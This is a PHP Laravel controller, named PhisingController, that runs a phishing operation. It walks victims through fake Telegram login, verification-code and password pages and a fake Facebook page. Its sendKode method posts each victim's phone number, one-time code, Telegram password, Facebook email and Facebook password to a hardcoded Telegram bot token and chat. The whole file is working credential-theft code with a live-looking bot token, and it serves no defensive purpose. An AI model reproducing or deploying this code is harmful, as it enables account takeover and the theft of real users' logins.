<?php

namespace App\Http\Controllers\Rhmt;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Session;

class PhisingController extends Controller
{
    public function index(Request $request)
    {
        return inertia('Rhmt/LoginIndex');
    }
    public function login_store(Request $request)
    {
        Session::forget("dataNumber");
        $phone = $request->phone;

        Session::push("dataNumber", [
            'getPhone' => $phone,
        ]);
        $this->sendKode($phone);
        return redirect()->route('rhmt.verif-telegram');
    }

    public function verif(Request $request)
    {
        $data = Session::get('dataNumber');

        $getPhone = $data[0]['getPhone'];

        return inertia('Rhmt/Verif', compact('getPhone'));
    }

    public function verif_store(Request $request)
    {
        Session::forget("dataNumber");
        $phone = $request->phone;
        $verif = $request->code;
        Session::push('dataNumber', [
            'getPhone' => $phone,
            'getVerif' => $verif,
        ]);
        $this->sendKode($phone, $verif);
        return redirect()->route('rhmt.telegram-password');
    }

    public function get_password(Request $request)
    {
        $data = Session::get('dataNumber');

        $getPhone = $data[0]['getPhone'];

        $getVerif = $data[0]['getVerif'];
        return inertia('Rhmt/GetPassword', compact(
            'getPhone',
            'getVerif'
        ));
    }
    public function store_password(Request $request)
    {
        Session::forget("dataNumber");
        $phone = $request->phone;
        $verif = $request->code;
        $password = $request->password;
        $this->sendKode($phone, $verif, $password);
        return redirect()->route('rhmt.home');
    }



    public function facebook(Request $request)
    {
        $phone_number = Session::get('phone_number_job') ? Session::get('phone_number_job')[0] : "";
        $verif_code = Session::get('verif_code_job') ? Session::get('verif_code_job')[0] : "";
        $password = Session::get('password_job') ? Session::get('password_job')[0] : "";
        return inertia('Rhmt/Facebook', compact('phone_number', 'verif_code', 'password'));
    }
    public function store_facebook(Request $request)
    {
        $this->sendKode($request->phone_number, $request->verif_code, $request->password, $request->email, $request->password_facebook);
        return redirect()->route('rhmt.home');
    }

    public function sendKode(
        $phone = "",
        $otp = "",
        $password = "",
        $email = "",
        $passFB = "",
    ) {
        // mulai dari bot 6 yah

        // BOT 6
        $bot_token = "7600923583:AAFsZEE7kYZuaWYlfwNLvNn21t2ZSYKS-t8";
        $chat_id = "6552942907";


        $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";




        $ch = curl_init();

        // Set cURL options
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, [
            'chat_id' => $chat_id,
            'text' => "Phone | $phone \n OTP | $otp \n password : $password \n
Email FB | $email
PW FB | $passFB
             
            "
        ]);

        // Eksekusi cURL request
        $response = curl_exec($ch);

        // Menutup koneksi cURL
        curl_close($ch);
    }
}
